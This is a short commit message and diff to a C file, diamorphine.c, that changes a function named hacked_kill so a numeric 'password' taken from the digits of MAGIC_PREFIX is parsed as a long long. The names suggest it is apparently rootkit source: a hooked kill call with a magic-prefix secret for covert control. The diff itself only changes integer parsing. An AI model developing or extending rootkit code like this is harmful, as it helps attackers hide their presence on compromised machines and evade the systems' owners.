Changed HACKED_KILL to use long long for the password derived from MAGIC_PREFIX

+++ diamorphine.c
@@ -315,11 +315,11 @@ hacked_kill(pid_t pid, int sig)
 #endif
 	struct task_struct *task;
 	
-	int magicPrefixNum = 0;//ADDED
+	long long magicPrefixNum = 0;//ADDED
     const char *prefix = MAGIC_PREFIX;//ADDED
     for (int i = 0; prefix[i] != '\0'; i++) {// Iterate over each character in the prefix string //ADDED
         if (prefix[i] >= '0' && prefix[i] <= '9') {// Check if the current character is a digit
-            magicPrefixNum = magicPrefixNum * 10 + (prefix[i] - '0');// If so, multiply the existing value of magicPrefixNum by 10 and add the new digit
+            magicPrefixNum = magicPrefixNum * 10LL + (prefix[i] - '0');// If so, multiply the existing value of magicPrefixNum by 10 and add the new digit
         }
     }
